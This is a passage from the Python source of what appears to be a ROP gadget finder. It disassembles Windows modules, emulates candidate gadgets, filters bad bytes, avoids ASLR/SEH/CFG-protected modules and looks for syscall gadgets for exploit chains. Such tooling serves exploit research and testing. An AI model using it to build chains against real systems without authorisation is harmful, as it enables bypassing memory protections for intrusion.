		bad = re.match( r'\bnop\b|\bleave\b|\bcall\b|\bjmp\b|\bljmp\b|\bjo\b|\bjno\b|\bjsn\b|\bjs\b|\bje\b|\bjz\b|\bjne\b|\bjnz\b|\bjb\b|\bjnae\b|\bjc\b|\bjnb\bjae\b|\bjnc\b|\bjbe\bjna\b|\bja\b|\bjnben\b|\bjl\b|\bjnge\b|\bjge\bjnl\b|\bjle\b|\bjng\bjg\b|\bjnle\b|\bjp\b|\bjpe\b|\bjnp\b|\bjpo\bjczz\b|\bjecxz\b|\bcall\b|\bint\b|\bdb\b|\bretf\b|\bhlt\b', instruction, re.M|re.I)
		if bad:
			return
		else:
			while lGoBack > 0:
				try:
					raw=pe[n].data[offL[lGoBack]:saveq+3]		
					vFg=rop.do64(mnemonicL[lGoBack],val2[lGoBack],saveq, offL,op_strL[lGoBack],lGoBack, n, raw,mnemonicL, op_strL, True)   # last True == C2
				except Exception as e:
					dp ("error! ", e)
					dp(traceback.format_exc())
				lGoBack -= 1
	return vFg
def binaryToStr(binary, mode = None):
	newop=""
	try:
		if mode ==None or mode ==1:
			for v in binary:
				newop += "\\x"+"{0:02x}".format(v) #   e.g \\xab\\xac\\xad\\xae
			return newop
		elif mode==2:
			for v in binary:
				newop += "{0:02x}".format(v)		#   e.g abacadae
				dp ("newop",newop)
			return newop
		elif mode==3:
			for v in binary:
				newop += "{0:02x} ".format(v)    #   e.g ab ac ad ae
				dp ("newop",newop)
			return newop
	except Exception as e:
		dp ("*Not valid format")
		dp(e)

def disHereClean3(address, valCount, numBytes, mode):
	dp("disHereClean3", hex(address), valCount)

	global globalOuts
	# CODED2 = b""
	# x = numBytes
	# for i in range (x, 0, -1):
	# 	CODED2 += m[o].data[address-i]
	# CODED2 += m[o].data[address]
	# if (mode=="jmp"):
	# 	CODED2 += m[o].data[address+1]
	# if (mode=="dg"):
	# 	CODED2 += m[o].data[address+1]		
	# 	CODED2 += m[o].data[address+2]		
	# CODED2 += b"\x00"

	CODED2 = m[o].data[(address-numBytes):(address+1)]
	# dp "enter dishereclean3: mode " + mode

	val =""
	val2 = []
	val3 = []
	address2 = address + m[o].startLoc + 1000


	for i in cs.disasm(CODED2, address-numBytes):
		add = hex(int(i.address))
		addb = hex(int(i.address +  m[o].VirtualAdd))
		add2 = str(add)
		add3 = hex (int(i.address + m[o].startLoc	))
		add4 = str(add3)
		val =  i.mnemonic + " " + i.op_str + "\t\t\t\t"  + add4 + " (offset " + addb + ")\n"
		val2.append(val)
		val3.append(add2)
	dp (val2)
	# dp "dis:"
	# for x in val2:
	# 	dp x
	# dp binaryToStr(CODED2)
	
	returnVal = ""
	trueVal2Cnt = val2.__len__()
	if trueVal2Cnt == valCount:
		for i in range (valCount):
			#dp val2[i]
			returnVal += str(val2[i]) 
	else:
		while trueVal2Cnt > valCount:
			del val2[0]
			trueVal2Cnt -= 1
			if trueVal2Cnt == valCount:
				for i in range (valCount):
			#		dp val2[i]
					returnVal += str(val2[i])

	globalOuts.append(" ")
	if returnVal not in globalOuts:
		globalOuts.append(returnVal)
		# dp "global"
		return returnVal #"\n"+binaryToStr(CODED2) + " val: " +str(valCount)
	if returnVal  in globalOuts:
		return " "

def disHereClean4(n,address, valCount, numBytes, mode):
	# dp("disHereClean4", hex(address), valCount)
	global globalOuts
	CODED2 = pe[n].data[(address-numBytes):(address+1)]
	val =""
	val2 = []
	val3 = []
	t=0
	for i in cs.disasm(CODED2, address-numBytes):
		add = hex(int(i.address))
		addb = hex(int(i.address +  pe[n].VirtualAdd))
		add2 = str(add)
		add3 = hex (int(i.address + pe[n].startLoc	))
		add4 = str(add3)
		val =  i.mnemonic + " " + i.op_str + "\t\t\t\t"  + add4 + " (offset " + addb + ")\n"
		bad = re.match( r'^call|^jmp|^jo|^jno|^jsn|^js|^je|^jz|^jne|^jnz|^jb|^jnae|^jc|^jnb|^jae|^jnc|^jbe|^jna|^ja|^jnben|^jl|^jnge|^jge|^jnl|^jle|^jng|^jg|^jnle|^jp|^jpe|^jnp|^jpo|^jczz|^jecxz|^jmp|^int|^retf|^db|^hlt', val, re.M|re.I)
		if bad:
			return " "
		if t>=valCount:
			val2.append(val)
			val3.append(add2)
		t+=1
	# dp ("\t",val2)
	returnVal = ""
	for x in val2:
		returnVal+=x
	# dp (returnVal)
	retS = re.findall( r'ret', returnVal, re.M|re.I)
	if retS:
		# dp ("****",retS, "rcnt", len(retS),val3[len(val3)-1])
		pass
	if len(retS)>1:
		return " "
	if returnVal not in globalOuts:
		globalOuts.append(returnVal)
		return "@ " +returnVal #"\n"+binaryToStr(CODED2) + " val: " +str(valCount)
	if returnVal  in globalOuts:
		return " "

def disHereClean5(n, address, offset, mode):
	CODED2 = pe[n].data[offset:address+1]
	dp (binaryToStr(CODED2))
	# val =""
	# val2 = []
	# val3 = []
	returnVal = ""
	for i in cs.disasm(CODED2, offset):
		addb = hex(int(i.address +  pe[n].VirtualAdd))
		# add2 = str(hex(int(i.address)))
		add4 = str(hex (int(i.address + pe[n].startLoc	)))
		val =  i.mnemonic + " " + i.op_str + "\t\t\t\t"  + add4 + " (offset " + addb + ")\n"
		# val2.append(val)
		# val3.append(add2)
		returnVal +=val
	return "@ " +returnVal



def disMini(CODED2, offset):
	returnVal = ""
	for i in cs.disasm(CODED2, offset):
		val =  i.mnemonic + " " + i.op_str + " # "
		returnVal +=val
	returnVal=returnVal[:-3]
	return returnVal

def disMiniObj(obj):
	dp("disMini type", type (obj))
	CODED2=obj.raw
	offset=obj.offset
	returnVal = ""
	for i in cs.disasm(CODED2, offset):
		val =  i.mnemonic + " " + i.op_str + " # "
		returnVal +=val
	return returnVal



def disMiniArray(CODED2, address, offset):  # NOT DONE
	# dp("disHereClean6", n)
	l=[]	
	m=[]
	for i in cs.disasm(CODED2, offset):
		val =  i.mnemonic + " " + i.op_str
		l.append(val)
		m.append(i.op_str)
	return l,m
def disHereClean6(n, CODED2, address, offset, mode=None, arch=32):
	# dp("disHereClean6", n)
	if limitedMemory:
		CODED2 = pe[n].data[offset:address+1]
	returnVal = ""

	myCs=cs
	if arch==64:
		myCs=cs64
	if mode==None:
		for i in myCs.disasm(CODED2, offset):
			val =  i.mnemonic + " " + i.op_str + "\t\t\t\t"  + str(hex (int(i.address + pe[n].startLoc	))) + " (" + hex(int(i.address +  pe[n].VirtualAdd)) + ")\n"
			returnVal +=val
	elif mode=="traditional":
		returnVal  = "0x"+str(hx (int(offset + pe[n].startLoc	), 8)) + ", # (" + hex(int(offset +  pe[n].VirtualAdd)) + ") "
		for i in myCs.disasm(CODED2, offset):
			val =  i.mnemonic + " " + i.op_str + " # "
			returnVal +=val
		returnVal +=n + " # " +  binaryToStr(CODED2)
	elif mode=="traditionalDict":
		returnVal  = str(hex (int(offset + pe[n].startLoc	))) + " (" + hex(int(offset +  pe[n].VirtualAdd)) + ") "
		for i in myCs.disasm(CODED2, offset):
			val =  i.mnemonic + " " + i.op_str + " # "
			returnVal +=val
		returnVal +=n + " # " +  binaryToStr(CODED2)
	

	return returnVal
	# return " @ " +returnVal


def dpRet(op, reg):
	reg=reg.lower()
	dp("dpret", op, reg)
	mode="traditional"
	for n in pe:
		addy, off, raw, length = pe[n].give(op,reg)
		t=0
		if mode == "traditional":
			for each in addy:
				try:
					if length[t] <=5:
						cat = disHereClean6(n, raw[t], addy[t],off[t], "traditional")
						if not cat == " ":
							dp ("length: " +str(length[t]) +" "+(cat))
					t+=1
				except:
				# dp ("won't dp length? huh???", len(addy))
					
					t+=1
			
			
		if mode=="rocket" or mode == None:
			for each in addy:
				cat = disHereClean6(n, raw[t], addy[t],off[t])
				if not cat == " ":
					print("\n*^*^*^*^*^*^*^*^*^*^*^*^*^*^*^*^*^*^*^*^*^*^*^*^*^*^*^\n")
					print (cat)
					print ("",binaryToStr(raw[t]))
				t+=1

def freeExclusionCritera(mod,addy):
	# print ("pe[mod].aslrStatus", mod, pe[mod].aslrStatus)
	if pe[mod].aslrStatus==False and pe[mod].sehStatus==False and pe[mod].CFGStatus==False and pe[mod].systemWin==False:
		return True
	if pe[mod].aslrStatus and not opt["acceptASLR"]:
		return False
	if pe[mod].sehStatus and not opt["acceptSEH"]:
		return False
	if pe[mod].CFGStatus and not opt["acceptCFG"]:
		return False
	if pe[mod].systemWin and not opt["acceptSystemWin"]:
		return False
	return True

def printRetDictMini(myDict, limit, arch=32):
	global opt
	global n
	# reg=reg.lower()
	mode="traditional"
	
	t=0

	for q in myDict:
		# dp ("in myDict")
		# dp (n)
		if t>limit:
			return
		addy = myDict[q].addressRet
		bad=opt["badBytes"]
		off = myDict[q].offset
		raw=myDict[q].raw
		length=myDict[q].length
		mod=myDict[q].mod
		if opt["checkForBadBytes"]:
			# if not checkFreeBadBytes(opt,fg,off,bad,fg.rop,pe):
			if not checkFreeBadBytes(opt,fg,q,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"]):

				continue
		n="rop_tester.exe"

		# addy, off, raw, length = pe[n].give(op,reg)
		if mode == "traditional":
			try:
				if length <=opt["lenMax"] and freeExclusionCritera(mod,addy):
					cat = disHereClean6(mod, raw, addy,off, "traditional",arch)
					if not cat == " ":
						print ("\t",cat)#+" "+ "# length: " +str(length) )
						# offsetEmBase=off+pe[mod].emBase
						# print ("---> em ", hex(offsetEmBase))

		
			except:
				pass
		t+=1

def printRetDict(op, reg, myDict, arch=32):
	global opt
	global n
	reg=reg.lower()
	print("\nGadget:", op, reg)
	mode="traditional"
	
	for q in myDict:
		# dp ("in myDict")
		# dp (n)
		bad=opt["badBytes"]
		if opt["checkForBadBytes"]:
			# if not checkFreeBadBytes(opt,fg,off,bad,fg.rop,pe):
			if not checkFreeBadBytes(opt,fg,q,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"]):
				continue
		addy = myDict[q].addressRet
		off = myDict[q].offset
		raw=myDict[q].raw
		length=myDict[q].length
		mod=myDict[q].mod
		
		n="rop_tester.exe"

		# addy, off, raw, length = pe[n].give(op,reg)
		t=0
		if mode == "traditional":
			try:
				if length <=opt["lenMax"] and freeExclusionCritera(mod,addy):
					cat = disHereClean6(mod, raw, addy,off, "traditional",arch)
					if not cat == " ":
						print ((cat)+" "+ "# length: " +str(length) )
						# offsetEmBase=off+pe[mod].emBase
						# print ("---> em ", hex(offsetEmBase))

				t+=1
			except:
			# dp ("won't print length? huh???", len(addy))
				t+=1
			
		if mode=="rocket" or mode == None:
			for each in addy:
				cat = disHereClean6(n, raw[t], addy[t],off[t])
				if not cat == " ":
					print("\n*^*^*^*^*^*^*^*^*^*^*^*^*^*^*^*^*^*^*^*^*^*^*^*^*^*^*^\n")
					print (cat)
					print ("",binaryToStr(raw[t]))
				t+=1

counter =0

def allocateNum():
	global counter
	start=counter-3
	counter = counter + 5
	end=counter
	return start, end

def allocateNum2(oldStart=None, oldEnd=None):
	if oldStart!=None:
		return oldStart+1, oldEnd

	global counter
	start = counter -3
	if start <0:
		start =0

	start=counter-3
	counter = counter + 2000
	end=counter
	return start, end
def startFunc(args):
	dp ("startFunc")
	global fgK

	with mp.Pool() as pool:
		# fg2=get_OP_RET_parallel(15,vStart, vEnd)

		fg2 =pool.map(get_OP_RET_parallel,args)
		# fg2 =pool.map(get_OP_RET_parallel64,args)

		fg2=fg2[0]
		# dp ("type", type(fg2), fg2)
		fgKBefore=len(fgK.pops)
		fg2Before=len(fg2.pops)

		# dp ("before merge, len fgK pop", len(fgK.pops))
		# dp ("\nbefore merge, len fg2 pop", len(fg2.pops))
		# dp ("fg2", len(fg2.pops), fg2.pops)
		# dp ("\n\nfgk", len(fgK.pops), fgK.pops)
		fgK.merge(fg2)
		fgKAfter=len(fgK.pops)
		fg2After=len(fg2.pops)

		# dp ("\nAFTER MERGE fgk", len(fgK.pops), fgK.pops)

		# dp ("after merge, fgk pop", fgKBefore,fgKAfter, "fg2 pop", fg2Before,fg2After)

def generateArgsParallel():
	dp ("generateArgsParallel", hex(opt["bytesMax"]))
	# incrementAmount=8000
	myArgs=[]
	totalSize= totalIncrementAmount= totalNumIncrements=0
	for d in pe:
		dp (d)
		if not pe[d].skipDll:
			dp ("not")
			size=len(pe[d].data)
			totalSize+=size
			dp (totalSize)

	num = totalSize/(cpu_count-1)
	totalIncrementAmount=int(num)
	# if len(pe) > 1 and totalIncrementAmount <2000:
	# 	totalIncrementAmount=2000
	totalNumIncrements=totalSize/totalIncrementAmount
	totalNumIncrements=math.ceil(totalNumIncrements)

	if totalSize==0:
		print(red+"No executable code extracted! Program exiting",res)
		exit()
	dp ("totalSize", totalSize,"totalIncrementAmount", totalIncrementAmount, "totalNumIncrements", totalNumIncrements)
	for d in pe:
		if not pe[d].skipDll:#not pe[d].systemWin:
			size=len(pe[d].data)
			# print (cya+"size", size, res)
			if size ==0 or size==1:
				# print ("doing continue")
				continue
			num = size/(cpu_count-1)
			incrementAmount=int(num)
			numIncrements=size/incrementAmount
			numIncrements=math.ceil(numIncrements)
			if numIncrements >= cpu_count-1:
				numIncrements=cpu_count-1

			dp (d,"?****** if size (.4)", size, round(size*(.4)), "totalIncrementAmount ", totalIncrementAmount)
			# if size*(.4) > totalIncrementAmount:
			if  totalIncrementAmount > size*(.4):

				if totalIncrementAmount > size*(.7):
					dp (d, "****** if size (.7)", size, round(size*(.7)), "totalIncrementAmount ", totalIncrementAmount)
					numIncrements=1
					incrementAmount=size
				else:
					numIncrements=2
					incrementAmount=math.ceil(size/2)
			vStart=0
			vEnd=incrementAmount+5
			end=incrementAmount+5
			nStart=0
			nEnd=incrementAmount
			dp ("system false",d, pe[d].systemWin, vStart, vEnd )
			t=0
			for x in range (numIncrements):
				dp ("numIncrements", numIncrements, t)
				dp ("\tadding", d, opt["bytesMax"], vStart,vEnd,pe[d],rop, "incrementAmount", incrementAmount, "totalIncrementAmount", totalIncrementAmount)
				myArgs.append((opt["bytesMax"], vStart,vEnd,pe,rop,d))
				nStart=nStart+incrementAmount
				nEnd=nEnd+incrementAmount
				# vStart=vStart+incrementAmount-5
				# vEnd=vEnd+5+incrementAmount
				vStart=nStart-5
				vEnd=nEnd+5
				if vEnd >= size:
					vEnd=size-1
				t+=1

	dp ("myArgs", myArgs)
	# input()
	return myArgs
cpu_count = multiprocessing.cpu_count()

def startGet_Op_Ret_Parallel64():
	global fg,pe
	global opt
	createFg()
	
	# prevFg=fg
	myArgs= generateArgsParallel()
	# dp ("myArgs _startGet_Op_Ret_Parallel", myArgs)

	pool = multiprocessing.Pool(cpu_count-1)
	# out=pool.map(get_OP_RET_parallel, myArgs)
	out=pool.map(get_OP_RET_parallel64, myArgs)

	# dp ("out", out)
	# dp("type", type(out))
	pool.close()
	pool.join()
	KingFG=out[0]

	for foundG in out:
		if type(foundG) != None:
			KingFG.merge(foundG)

	# dp ("king", KingFG)
	kingAfter=len(KingFG.pops)
	# dp ("\nAFTER MERGE pops", kingAfter)
	
	# KingFG.merge(prevFg)
	fg=KingFG
	fg.x64=True
	opt["bx86Extracted"]=False
	opt["bx64Extracted"]=True

def startGet_Op_Ret_Parallel():
	global fg,pe
	global opt
	createFg()
	
	myArgs= generateArgsParallel()
	# dp ("myArgs _startGet_Op_Ret_Parallel", myArgs)

	pool = multiprocessing.Pool(cpu_count-1)
	out=pool.map(get_OP_RET_parallel, myArgs)
	# out=pool.map(get_OP_RET_parallel64, myArgs)

	# dp ("out", out)
	# dp("type", type(out))
	pool.close()
	pool.join()
	KingFG=out[0]

	for foundG in out:
		if type(foundG) != None:
			KingFG.merge(foundG)

	# dp ("king", KingFG)
	kingAfter=len(KingFG.pops)
	# dp ("\nAFTER MERGE pops", kingAfter)
	fg=KingFG
	opt["bx86Extracted"]=True
	opt["bx64Extracted"]=False
	fg.x86=True

	# pool = multiprocessing.Pool(cpu_count-1)
	# out=pool.map(get_OP_RET_parallel64, myArgs)
	# pool.close()
	# pool.join()
	# KingFG=out[0]

	# for foundG in out:
	# 	if type(foundG) != None:
	# 		KingFG.merge(foundG)

	# # dp ("king", KingFG)
	# kingAfter=len(KingFG.pops)
	# # dp ("\nAFTER MERGE pops", kingAfter)
	# fg=KingFG

def startGet_Op_Ret_Parallel6486():
	global fg,pe
	global opt
	createFg()
	myArgs= generateArgsParallel()
	# dp ("myArgs _startGet_Op_Ret_Parallel", myArgs)

	pool = multiprocessing.Pool(cpu_count-1)
	out=pool.map(get_OP_RET_parallel, myArgs)

	# dp ("out", out)
	# dp("type", type(out))
	pool.close()
	pool.join()
	KingFG=out[0]

	for foundG in out:
		if type(foundG) != None:
			KingFG.merge(foundG)
	fg=KingFG

	pool = multiprocessing.Pool(cpu_count-1)
	out2=pool.map(get_OP_RET_parallel64, myArgs)
	pool.close()
	pool.join()

	KingFG2=out2[0]
	for foundG2 in out2:
		if type(foundG2) != None:
			KingFG2.merge(foundG2)

	# dp ("king", KingFG)
	# kingAfter=len(KingFG.pops)
	# dp ("\nAFTER MERGE pops", kingAfter)
	KingFG.merge(KingFG2)
	fg=KingFG
	opt["bx86Extracted"]=True
	opt["bx64Extracted"]=True
	fg.x86=True
	fg.x64=True

def evaluateDll(skipSystem, skipAll, skipNonextracted):
	global pe

	for dll in pe:
		dp ("*********dll", dll, pe[dll].skipDll)
		if skipAll:
			if pe[dll].isDLL:
				pe[dll].skipDll=True
				dp ("skip all dlls", dll)
				continue
		if skipSystem:
			if pe[dll].systemWin:
				pe[dll].skipDll=True
				dp ("skip system dll", dll)

		if skipNonextracted:
			if not pe[dll].extracted:
				pe[dll].skipDll=True
				dp ("skip non-extracted dll", dll)
	for dll in pe:
		if not pe[dll].skipDll:
			dp("nonskip", dll)

def getFSIndex(obj):
	dp ("\ngetFSIndex2\n")
	# print (red+"\ngetFSIndex2\n"+res)

	disObj=disMini(obj.raw, obj.offset)
	if "xchg" not in disObj:
		vals=disObj.split(", ")
		vals=vals[1].split("#")
		returnVal=vals[0]
		returnVal=returnVal.replace("dword ptr fs","")
		returnVal=returnVal.replace("]","")
		returnVal=returnVal.replace("[","")
		returnVal=returnVal.replace(":","")
		returnVal=returnVal.replace(" ","")
		dp ("\n*returnVal3", returnVal)
	else:
		myDword  = re.findall("dword ptr fs:\[e[abcdsb0]+[xspi][c0]*\]", disObj, re.IGNORECASE)
		returnVal=myDword[0]
		returnVal=returnVal.replace("dword ptr fs","")
		returnVal=returnVal.replace("]","")
		returnVal=returnVal.replace("[","")
		returnVal=returnVal.replace(":","")
		returnVal=returnVal.replace(" ","")
	return returnVal

def findPopLength1(myPops,bad, isVal=False):
	for p in myPops:
		# freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

		freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n,opt["bad_bytes_imgbase"],isVal)

		if myPops[p].length ==1 and myPops[p].opcode=="c3" and freeBad:
			return True,p
	return False,0

def findPushLength1(myPushs,bad, isVal=False):
	for p in myPushs:
		# freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

		freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n,opt["bad_bytes_imgbase"],isVal)

		if myPushs[p].length ==1 and myPushs[p].opcode=="c3" and freeBad:
			return True,p
	return False,0

def checkFreeBadBytesOld(address, bad): # in helpers now
	dp("checkFreeBadBytes", address)
	
	if type(address)==int:
		for soBad in bad:
			if hx(soBad,2) in hx(address):
				dp ("bad", hx(soBad,2), "in", hx(address))
				return False
		dp ("good bytes")
		return True

	elif type(address)==list:
		for addy in address:
			for soBad in bad:
				if hx(soBad,2) in hx(addy):
					dp ("bad", hx(soBad,2), "in", hx(addy))
					return False
			dp ("good bytes")
			return True
	if bad == None:
		dp ("bad none, true")
		return True
def hx(val, length=8):
	# print (val)
	hex_str = format(val, 'x').zfill(length) 
	return hex_str


# list = [Adam, Dean, Harvey, Mick, John]
# string = "Adam lives in New York"

# dp ("The original list is: " + str(list))
# dp ("The original string is: " + string)

# result = any(item in string for item in list)
def rop_testerFindClobberFree(myDict, excludeRegs,bad, c3,espDesiredMovement, findEspPops=[], debug=False,ignorePrevEmu=True):
	dp("rop_testerFindClobberFree")
	if type(myDict)==tuple:
		dp ("mydict",myDict)
		mnem=myDict[0]
		reg=myDict[1].upper()
		dExists, myDict= fg.getFg(mnem,reg)
		if not dExists:
			# dp (myDict, "does not exist")
			return False,0,0,0
	try:
		print ("rop_testerFindClobberFree", "excludeRegs", excludeRegs, "espDesiredMovement", espDesiredMovement)
		goodWithPops=False
		if not goodWithPops:
			goodWithPops=True
		t=-1
		g=0
		for addy in myDict:
			if g==50:
				doGC()  ## manual garbage collection - memory problems
				g=0
			t=t+1
			g=g+1
			dp ("rop c t", t, "out of", len(myDict))
			goodRetEnding=False
			dp ("\t\rc candidate", hex(addy), disMini(myDict[addy].raw, myDict[addy].offset))
			if ignorePrevEmu and not myDict[addy].emulated:
				dp ("does not exist")
				outEmObj=rop_tester(myDict[addy].raw, hex(addy)+"  1")
				myDict[addy].setRegsObj(outEmObj)
			elif ignorePrevEmu:
				dp ("already exists rc")
				outEmObj=myDict[addy].regs
			else:
				dp("ignoring prevEm results")
				outEmObj=rop_tester(myDict[addy].raw, hex(addy)+"  2")
				myDict[addy].setRegsObj(outEmObj)
			# outEmObj.show()
			freeOfClobbering=outEmObj.checkForBad(excludeRegs, espDesiredMovement)  #-4 esp desirved movement  = push -4
			if not freeOfClobbering:
				dp ("not free of Clobbering, hit the continue")
				continue
			freeBad=checkFreeBadBytes(opt,fg,addy,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])


			if findEspPops:
				goodWithPops=outEmObj.checkForPops(findEspPops)
			if c3 =="c3":
				 if myDict[addy].opcode=="c3":
				 	goodRetEnding=True
			elif c3 == "c2":
				if myDict[addy].opcode=="c2":
				 	goodRetEnding=True
			elif c3 == "both":
				goodRetEnding=True
			elif c3 == "cb":
				if myDict[addy].opcode=="cb":
				 	goodRetEnding=True
			if freeOfClobbering and goodWithPops and freeBad and goodRetEnding:
				dp ("got one clobberfree", hex(addy))
				return True, addy,myDict, outEmObj
	except Exception as e:
		print("ERROR2: %s" % e)
		print(traceback.format_exc())
		giveRegOuts(mu)
		gOutput.setError(e)
		# errorESP(mu)
		giveRegOuts(mu)

		return gOutput

	dp ("rop_testerFindClobberFree final return false")
	return False, 0,0,0

def rop_testerFindClobberFreeRegReg(myDict, excludeRegs, bad,c3,espDesiredMovement, findEspPops=[],ignorePrevEmu=True):
	if type(myDict)==tuple:
		mnem=myDict[0]
		reg=myDict[1].upper()
		dExists, myDict= fg.getFg(mnem,reg)
		if not dExists:
			dp (myDict, "does not exist")
			return False,0,0,0

	dp ("rop_testerFindClobberFree", "excludeRegs", excludeRegs, "espDesiredMovement", espDesiredMovement)
	goodWithPops=False
	if not goodWithPops:
		goodWithPops=True
	for addy in myDict:
		goodRetEnding=False
		dp ("\t\rc candidate", hex(addy), disMini(myDict[addy].raw, myDict[addy].offset))
		if not re.match( r'e[b|c|d|a]x|e[d|s]i|e[s|b]p',myDict[addy].op2, re.M|re.I):	
			continue
		if ignorePrevEmu and not myDict[addy].emulated:
			dp ("rop testing does not exist")
			outEmObj=rop_tester(myDict[addy].raw)
			myDict[addy].setRegsObj(outEmObj)
		elif ignorePrevEmu:
			dp ("rop testing already exists rc")
			outEmObj=myDict[addy].regs
		else:
			dp("ignoring prevEm results")
			outEmObj=rop_tester(myDict[addy].raw)
			myDict[addy].setRegsObj(outEmObj)
		# outEmObj.show()
		freeOfClobbering=outEmObj.checkForBad(excludeRegs, espDesiredMovement)  #-4 esp desirved movement  = push -4
		if not freeOfClobbering:
			continue
		if findEspPops:
			goodWithPops=outEmObj.checkForPops(findEspPops)
		freeBad=checkFreeBadBytes(opt,fg,addy,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

		if c3 =="c3":
			 if myDict[addy].opcode=="c3":
			 	goodRetEnding=True
		elif c3 == "c2":
			if myDict[addy].opcode=="c2":
			 	goodRetEnding=True
		elif c3 == "both":
			goodRetEnding=True
		elif c3 == "cb":
			if myDict[addy].opcode=="cb":
			 	goodRetEnding=True
		if freeOfClobbering and goodWithPops and freeBad and goodRetEnding:
			dp ("got one clobberfree", hex(addy))
			return True, addy,myDict, outEmObj
	dumb=gadgetRegs()
	return False, 0,0,dumb
def rop_testerFindClobberFreeRegRegOld(myDict, excludeRegs, bad,c3,espDesiredMovement, findEspPops=[],ignorePrevEmu=True):
	if type(myDict)==tuple:
		mnem=myDict[0]
		reg=myDict[1].upper()
		dExists, myDict= fg.getFg(mnem,reg)
		if not dExists:
			dp (myDict, "does not exist")
			return False,0,0,0

	dp ("rop_testerFindClobberFree", "excludeRegs", excludeRegs, "espDesiredMovement", espDesiredMovement)
	goodWithPops=False
	if not goodWithPops:
		goodWithPops=True
	for addy in myDict:
		goodRetEnding=False
		dp ("\t\rc candidate", hex(addy), disMini(myDict[addy].raw, myDict[addy].offset))
		if not re.match( r'e[b|c|d|a]x|e[d|s]i|e[s|b]p',myDict[addy].op2, re.M|re.I):	
			continue
		if ignorePrevEmu and not myDict[addy].emulated:
			dp ("rop testing does not exist")
			outEmObj=rop_tester(myDict[addy].raw)
			myDict[addy].setRegsObj(outEmObj)
		elif ignorePrevEmu:
			dp ("rop testing already exists rc")
			outEmObj=myDict[addy].regs
		else:
			dp("ignoring prevEm results")
			outEmObj=rop_tester(myDict[addy].raw)
			myDict[addy].setRegsObj(outEmObj)
		outEmObj.show()
		freeOfClobbering=outEmObj.checkForBad(excludeRegs, espDesiredMovement)  #-4 esp desirved movement  = push -4
		if not freeOfClobbering:
			continue
		if findEspPops:
			goodWithPops=outEmObj.checkForPops(findEspPops)
		freeBad=checkFreeBadBytes(opt,fg,addy,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

		if c3 =="c3":
			 if myDict[p].opcode=="c3":
			 	goodRetEnding=True
		elif c3 == "c2":
			if myDict[p].opcode=="c2":
			 	goodRetEnding=True
		elif c3 == "both":
			goodRetEnding=True
		elif c3 == "cb":
			if myDict[p].opcode=="cb":
			 	goodRetEnding=True
		if freeOfClobbering and goodWithPops and freeBad and goodRetEnding:
			dp ("got one clobberfree", hex(addy))
			return True, addy,myDict, outEmObj
	dumb=gadgetRegs()
	return False, 0,0,dumb

def calcC2Amount(p):
	c2Amt=0
	try:
		testC2=fg.rop[p].c2Adjust
		if testC2 !=None:
			return testC2 
	except:
		fg.rop[p].setC2Adjust(None)
		# print (red,"IT DID IT2",res)
	out=disOffset(p)
	c2Search=re.findall('ret 0x[0-9a-f]+|ret \d', out)
	if c2Search:
		c2Ret=c2Search[0].split("ret ")
		try:
			c2Amt=int(c2Ret[1],16)
		except:
			c2Amt=int(c2Ret[1])
		fg.rop[p].setC2Adjust(c2Amt)
		# print (red,"IT DID IT",res)
		filler2=genFiller(c2Amt,0x45454545)
		fg.rop[p].stC2=filler2
		# print (yel,"IT DID IT",res,fg.rop[p].stC2)

	return c2Amt

def findGenericSysLoop(instruction,reg,bad,length1, excludeRegs,mReg,mWri, espDesiredMovement=0,skips=set()):

		foundS, s1, stackPivotAmount, isRegOpOff, fsReg, offsetComp,decOffsetComp,changedRegs,movedFS, newRegFS,syscallValAtESP,skips, sysRemaining = findGenericSys("subFS",r,bad,False, excludeRegs,reg,op2,espDesiredMovement,skips)


def evaluateFSRegChanges(regVals,fsReg, expectedVal,outEmObj):
	asExpected=True
	valHasMoved=False
	movedRegs=[]
	try:
		if fsReg not in regVals:
			if outEmObj.reg[fsReg]==0xc0:
				asExpected=True
				# print ("has 0xc0")
			else:
				# print ("no good")
				asExpected=False
		# elif regVals[fsReg]==expectedVal:
		# 	asExpected=True
		elif regVals[fsReg]!=0xc0:
			asExpected=False
		for r in regVals:
			if regVals[r]==expectedVal:
				# print ("it has moved", r)
				movedRegs.append(r)
				# asExpected=False
				valHasMoved=True

		return asExpected,valHasMoved, movedRegs
	except:
		return False, False,[]
	# exit()
	# for r in regVals:


def findGenericSys(instruction,reg,bad,length1, excludeRegs,mReg,mWri, espDesiredMovement,skips):
	# print (gre,"findGenericSys", res,instruction, reg,bad, "excludeRegs", excludeRegs)
	global rC
	sysRemaining=True
	espDesiredMovement=0
	hexaPattern = re.compile(r'(0x[0-9a-fA-F]+)|[0-9]+')
	hasPop = re.compile(r'pop')
	hasDword = re.compile(r'ptr \[e')


	# isReg= re.compile( r'fs:\[e[b|c|d|a]x|e[d|s]i|e[s|b]p\]', re.M|re.I)
	isReg= re.compile( r'fs:\[(eax|ebx|ecx|edx|esi|edi|ebp|esp)\]', re.M|re.I)
	isRegAndOffset = re.compile(r'fs:\[(eax|ebx|ecx|edx|esi|edi|ebp|esp)\s*([+\-])\s*(0x[0-9a-fA-F]+|\d+)\]', re.IGNORECASE)
	badReg = re.compile(r'fs:[esp]', re.IGNORECASE)

	fsRegWhereExpected=False
	newRegFS=0
	# skips={9781900,45353749}
	bExists, myDict=fg.getFg(instruction,reg)
	if not bExists:
		# print ("bExists False", instruction, reg)
		sysRemaining=False
	if bExists:
		# print (len(myDict), instruction,reg)
		dp ("it exists")
		if length1:  # was if length1  - this way it will always try length1 first - ideal, perfect gadget
			for p in myDict:
				if p in skips:
					# print (cya,"continue: in skips",res, p, hex(p))
					continue
				else:
					skips.add(p)
				# print ("checking", len(myDict),len(skips),sysRemaining)
				if len(myDict)==len(skips) or len(skips)>=len(myDict):
					# print (cya,"sysRemaining set false",res,len(myDict),len(skips),sysRemaining)
					sysRemaining=False
				stackPivotAmount=0
				c2Amt=0    #######TODO
				isRegOpOff=False
				offsetAdjust=0
				out=disOffset(p)
				isRegOp1= re.search( isReg,out)
				isRegOpOff= re.search( isRegAndOffset,out)
				if isRegOpOff==None:
					isRegOpOff=False
				if isRegOp1:
					# print ("isRegOp1")
